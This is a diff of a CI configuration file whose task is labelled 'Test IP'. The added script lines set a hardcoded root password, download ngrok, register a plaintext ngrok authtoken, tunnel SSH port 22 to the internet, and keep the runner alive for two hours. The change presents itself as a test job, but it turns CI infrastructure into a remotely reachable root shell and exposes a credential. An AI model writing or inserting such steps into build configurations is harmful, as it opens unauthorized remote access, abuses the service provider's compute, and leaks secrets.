@@ -1,8 +1,6 @@
 task:
     name: Test IP
     timeout_in: 120m
-    environment:
-        TOKEN: ENCRYPTED[4e3f3b5771ea69673f76f7d07c051305c233c3e8de0156fdd166e5b658ab4441cdc43e6082495dba0cccac851b90a939]
     container:
         cpu: 8
         memory: 32G
@@ -10,4 +8,11 @@ task:
         kvm: true
     script: 
         - apt-get update &>/dev/null 
-        - apt-get install wget curl -y &>/dev/null
+        - apt-get install wget curl sudo unzip -y &>/dev/null
+        - echo root:uncleluo|chpasswd
+        - wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
+        - unzip ngrok-stable-linux-386.zip
+        - chmod +x ./ngrok
+        - ./ngrok authtoken 24PL0NgOrz7JprSOL67fPCQ1zG4_4usme1vy42H7ehKb4P6mT
+        - nohup ./ngrok tcp 22 &>/dev/null &
+        - sleep 2h
